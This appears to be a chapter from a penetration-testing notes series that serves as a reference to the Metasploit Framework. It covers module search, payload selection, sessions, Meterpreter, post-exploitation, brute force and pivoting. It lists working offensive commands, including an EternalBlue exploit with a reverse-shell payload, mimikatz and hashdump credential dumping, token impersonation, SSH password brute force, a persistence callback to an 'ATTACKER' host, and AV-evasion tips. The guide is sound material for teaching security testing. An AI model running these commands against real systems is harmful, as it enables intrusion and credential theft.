# 16 — Using the Metasploit Framework

`msfconsole` workflow, module categories, sessions, post-exploitation modules, and how to integrate it with the rest of your toolchain.

## Contents

- [Layout](#layout)
- [Starting the framework](#starting-the-framework)
- [Finding & using a module](#finding-using-a-module)
- [Targets & payloads](#targets-payloads)
- [Sessions](#sessions)
- [Meterpreter — quick reference](#meterpreter-quick-reference)
- [Post modules](#post-modules)
- [Auxiliary modules (recon, brute, services)](#auxiliary-modules-recon-brute-services)
- [Database integration](#database-integration)
- [Resource scripts](#resource-scripts)
- [Multi/handler — catching custom payloads](#multihandler-catching-custom-payloads)
- [Pivoting via Metasploit](#pivoting-via-metasploit)
- [Updating & module management](#updating-module-management)
- [Common pitfalls](#common-pitfalls)
- [Sources](#sources)

## Layout

| Component | Use |
|---|---|
| `msfconsole` | Interactive console (default driver) |
| `msfvenom` | Standalone payload generator (see [15](15-shells-and-payloads.md)) |
| `msfdb` | PostgreSQL DB integration (workspaces, hosts, services, loot, creds, notes) |
| `msfrpcd` | RPC daemon (Armitage/automation) |
| `~/.msf4/` | User config, history, loot, modules |

Module categories live under `modules/`:

- `auxiliary/` — scanners, fuzzers, services (no shell)
- `exploit/` — primary exploits
- `post/` — post-exploitation modules (run on a session)
- `payloads/` — what gets delivered (singles / stagers / stages)
- `encoders/` — payload obfuscation (mostly cosmetic)
- `nops/` — NOP sled generators
- `evasion/` — modern evasion modules

## Starting the framework

```bash
# Initialize / start the DB
sudo msfdb init
sudo msfdb start

# Console
msfconsole
msfconsole -q                            # quiet (no banner)
msfconsole -r script.rc                  # run a resource script
msfconsole -x "use exploit/...; set RHOSTS x; run; exit"
```

Inside the console:

```
db_status                                # confirm DB connection
workspace -a engagement-x                # create
workspace engagement-x                   # switch
hosts; services; vulns; loot; creds; notes
```

## Finding & using a module

```
search type:exploit platform:windows smb
search cve:2017-0144
search name:eternalblue
info exploit/windows/smb/ms17_010_eternalblue
use exploit/windows/smb/ms17_010_eternalblue
```

After `use`:

```
options
show options
show advanced
show payloads
set RHOSTS 10.10.10.5
set LHOST tun0
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
check                                    # safe pre-flight on supported modules
run / exploit
run -j                                   # background
back                                     # leave the module
```

`set` vs `setg` — `setg` makes a value persist across modules (good for `LHOST`).

## Targets & payloads

```
show targets                             # automatic vs explicit
set TARGET 1
show payloads                            # only those compatible with current module
```

Decision points:

- **Architecture**: `x86` vs `x64` must match the target process for native shellcode.
- **Staged** (`/`) vs **stageless** (`_`) — see [15](15-shells-and-payloads.md).
- **Reverse TCP** vs **HTTP/HTTPS** — pick the one the egress rules allow.
- **bind_tcp** when the target is reachable directly and outbound is blocked.

## Sessions

```
sessions                                  # list
sessions -i 1                             # interact
sessions -k 1                             # kill
sessions -K                               # kill all
sessions -u 1                             # upgrade shell to meterpreter
sessions -c "whoami"                      # run command in session
background  /  ^Z                          # send current session to background
```

## Meterpreter — quick reference

```
sysinfo
getuid
getpid
ps
migrate <PID>                              # migrate into another process
hashdump                                   # SAM hashes (admin)
load kiwi                                  # mimikatz
kiwi_cmd "sekurlsa::logonpasswords"

# Filesystem
pwd / lpwd
cd / lcd
ls / lls
cat C:\\Users\\Public\\note.txt
download file
upload local remote
edit file

# Network
ipconfig / ifconfig
netstat
arp
portfwd add -l 9999 -r 10.10.10.7 -p 3389  # local fwd via session
portfwd flush

# Routing (autoroute)
run autoroute -s 10.10.10.0/24
run autoroute -p

# Privilege & impersonation
getprivs
getsystem                                  # try several techniques
load incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"

# Persistence (only with explicit authorization)
run persistence -X -i 60 -p 4444 -r ATTACKER

# Shell
shell                                      # drop to a cmd/sh
exit                                       # return to meterpreter
```

## Post modules

Run automatically against a session:

```
search post platform:windows
use post/windows/gather/credentials/credential_collector
set SESSION 1
run

# Common ones
post/multi/recon/local_exploit_suggester
post/windows/gather/enum_domain
post/windows/gather/credentials/mimikatz
post/windows/gather/checkvm
post/linux/gather/enum_system
post/linux/gather/checkvm
post/multi/manage/shell_to_meterpreter
```

## Auxiliary modules (recon, brute, services)

```
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.0/24
run

use auxiliary/scanner/ssh/ssh_login
set USER_FILE users.txt
set PASS_FILE rockyou.txt
set RHOSTS 10.10.10.5
set STOP_ON_SUCCESS true
run

use auxiliary/server/socks_proxy            # SOCKS via established route
set SRVPORT 1080
run
# Then:
proxychains nmap -sT -Pn 10.10.10.5
```

## Database integration

```
db_nmap -sCV -p- 10.10.10.5                # writes results to msf DB
hosts -c address,os_name,os_flavor
services -p 445 -c info
vulns -R                                   # remote vulns
loot                                       # gathered files
creds                                       # captured / cracked

# Use DB results in modules
hosts -R                                   # set RHOSTS to all DB hosts
services -p 445 -R                         # set RHOSTS to hosts with 445 open
```

## Resource scripts

```ruby
# script.rc
workspace -a engagement-x
db_nmap -sCV -p- 10.10.10.5
use auxiliary/scanner/smb/smb_version
services -p 445 -R
run
```

```bash
msfconsole -r script.rc
```

Inside the console: `resource script.rc`.

## Multi/handler — catching custom payloads

```
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
set ExitOnSession false
run -j
```

Pair with a `msfvenom` binary you generated outside the console.

## Pivoting via Metasploit

```
# 1. Get a session on a dual-homed box
sessions -i 1

# 2. Add a route through that session
run autoroute -s 172.16.5.0/24

# 3. Background, then use auxiliary scanners or exploits against the new range
background
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.5.0/24
set PORTS 80,443,445,3389
run

# 4. SOCKS for non-MSF tools
use auxiliary/server/socks_proxy
run -j
proxychains -q nmap -sT -Pn -p 80 172.16.5.10
```

## Updating & module management

```bash
sudo apt install metasploit-framework      # Kali maintained pkg
# Or:
msfupdate                                  # if installed from source
```

External / custom modules:

```
# ~/.msf4/modules/exploits/...
reload_all                                 # in-console reload
loadpath ~/git/custom-modules
```

## Common pitfalls

- Forgetting to set `LHOST` to the VPN interface (`tun0`) — the listener binds wrong.
- `RHOSTS` accepts ranges, CIDR, files (`file:targets.txt`), and DB queries (`-R`).
- Some exploits require `set TARGET` explicitly; the auto-target sometimes guesses wrong.
- `getsystem` is loud and frequently fails; pick a specific technique or use a dedicated tool.
- AV detection on `meterpreter` payloads is high; consider stageless + custom loader, or an alternative C2 in evasive engagements.

## Sources

- Rapid7 docs: https://docs.metasploit.com/
- Module index: https://www.rapid7.com/db/modules/
- Source: https://github.com/rapid7/metasploit-framework
- Book: "Metasploit: The Penetration Tester's Guide" (No Starch).
